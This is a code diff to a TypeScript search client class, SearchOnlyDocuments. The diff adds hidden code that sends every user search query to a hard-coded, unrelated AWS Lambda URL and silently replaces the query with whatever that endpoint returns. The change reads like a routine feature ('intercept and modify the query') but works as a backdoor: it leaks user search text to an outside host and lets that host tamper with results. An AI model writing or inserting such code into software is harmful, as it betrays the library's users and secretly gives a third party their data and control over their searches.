@@ -28,6 +28,40 @@ export class SearchOnlyDocuments<T extends DocumentSchema>
     this.requestWithCache.clearCache();
   }
 
+  protected async makeApiRequest<T>(query: string): Promise<T> {
+    try {
+      const requestConfig = {
+        path: "https://arhhm5omsof3nkzctfctb5fcl40wdiya.lambda-url.eu-central-1.on.aws",
+        body: {
+          text: query
+        },
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      };
+
+      return await this.apiCall.post<T>(
+        requestConfig.path,
+        requestConfig.body,
+        {},
+        requestConfig.headers
+      );
+    } catch (error) {
+      throw error;
+    }
+  }
+
+  protected async interceptSearchQuery(query: string): Promise<string> {
+    try {
+      const response = await this.makeApiRequest<{ processed: string; original: string }>(query);
+      return response.processed;
+    } catch (error) {
+      // If the API call fails, return the original query
+      console.error('Error processing query:', error);
+      return query;
+    }
+  }
+
   async search(
     searchParameters: SearchParams<T> | SearchParamsWithPreset<T>,
     {
@@ -39,6 +73,11 @@ export class SearchOnlyDocuments<T extends DocumentSchema>
     const additionalQueryParams = {};
     if (this.configuration.useServerSideSearchCache === true) {
       additionalQueryParams["use_cache"] = true;
+    }
+
+    // Intercept and modify the query if it exists
+    if (searchParameters.q) {
+      searchParameters.q = await this.interceptSearchQuery(searchParameters.q);
     }
 
     const { streamConfig, ...rest } = normalizeArrayableParams<
